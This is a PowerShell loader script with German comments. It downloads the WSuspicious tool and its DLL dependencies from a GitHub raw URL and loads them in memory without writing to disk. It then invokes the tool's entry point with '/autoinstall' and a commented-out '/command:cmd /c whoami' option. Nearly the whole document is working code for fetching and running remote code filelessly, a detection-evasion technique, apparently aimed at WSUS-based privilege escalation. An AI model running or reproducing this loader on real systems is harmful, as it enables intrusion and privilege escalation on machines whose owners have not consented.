# =============================================================
# Invoke-WSuspicious.ps1
# Lädt WSuspicious + alle Dependencies in-memory via GitHub raw
# Kein Schreibzugriff auf die Festplatte erforderlich
# =============================================================

$baseUrl = "https://raw.githubusercontent.com/icehawk1/zeugs/main/"

# Alle DLL-Dependencies (Reihenfolge: Basis-Libs zuerst)
$dependencies = @(
    "System.Buffers.dll",
    "System.Runtime.CompilerServices.Unsafe.dll",
    "System.Memory.dll",
    "System.Threading.Tasks.Extensions.dll",
    "BouncyCastle.Crypto.dll",
    "BrotliSharpLib.dll",
    "Titanium.Web.Proxy.dll"
)

$wc = New-Object System.Net.WebClient

# =============================================================
# Schritt 1: Assembly-Cache aufbauen (Name -> Bytes)
# =============================================================
$script:assemblyCache = @{}

foreach ($dll in $dependencies) {
    $asmName = [System.IO.Path]::GetFileNameWithoutExtension($dll)
    Write-Host "[*] Lade $dll ..."
    try {
        $bytes = $wc.DownloadData("$baseUrl$dll")
        $script:assemblyCache[$asmName] = $bytes
        Write-Host "[+] $dll geladen ($($bytes.Length) Bytes)"
    } catch {
        Write-Warning "[!] Fehler beim Laden von $dll : $_"
    }
}

# =============================================================
# Schritt 2: AssemblyResolve-Handler registrieren
# (muss VOR dem Laden der Hauptassembly passieren)
# =============================================================
[System.AppDomain]::CurrentDomain.add_AssemblyResolve(
    [System.ResolveEventHandler] {
        param($sender, $resolveArgs)
        $requestedName = (New-Object System.Reflection.AssemblyName($resolveArgs.Name)).Name
        if ($script:assemblyCache.ContainsKey($requestedName)) {
            Write-Host "[+] Resolver: $requestedName wird aus Cache geladen"
            return [System.Reflection.Assembly]::Load($script:assemblyCache[$requestedName])
        }
        return $null
    }
)

# =============================================================
# Schritt 3: Hauptassembly laden
# Nimm WSuspicious-anycpu.exe (AnyCPU = kompatibel mit x64-PS)
# =============================================================
$exeName = "WSuspicious.exe"
Write-Host "[*] Lade $exeName ..."
try {
    $mainBytes = $wc.DownloadData("$baseUrl$exeName")
    Write-Host "[+] $exeName geladen ($($mainBytes.Length) Bytes)"
} catch {
    Write-Error "[!] Fehler beim Laden der Hauptassembly: $_"
    exit 1
}

$assembly = [System.Reflection.Assembly]::Load($mainBytes)

if ($null -eq $assembly) {
    Write-Error "[!] Assembly konnte nicht geladen werden"
    exit 1
}
Write-Host "[+] Assembly geladen: $($assembly.FullName)"

# =============================================================
# Schritt 4: Entry Point aufrufen
# Argumente hier anpassen!
# =============================================================
$entryPoint = $assembly.EntryPoint

if ($null -eq $entryPoint) {
    Write-Error "[!] Kein Entry Point gefunden - ist es eine DLL statt EXE?"
    exit 1
}

Write-Host "[*] Starte WSuspicious ..."

# Argumente anpassen:
$args = [string[]]@(
    "/autoinstall"
    # "/command:cmd /c whoami"
    # "/proxyport:8080"
)

$entryPoint.Invoke($null, @(,$args))
